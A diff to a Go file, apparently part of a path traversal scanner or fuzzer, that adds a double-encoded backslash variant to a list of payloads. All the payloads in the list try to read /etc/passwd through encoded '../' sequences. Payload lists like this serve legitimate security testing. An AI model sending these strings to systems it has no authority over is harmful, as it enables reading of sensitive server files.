@@ -45,6 +45,7 @@ var payloads = []string{
 	"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
 	"../../../../../../../../../../etc/passwd",
 	"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+	"..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/passwd",
 	"..%252f..%252f..%252f..%252fetc/passwd",
 	"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
 	"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
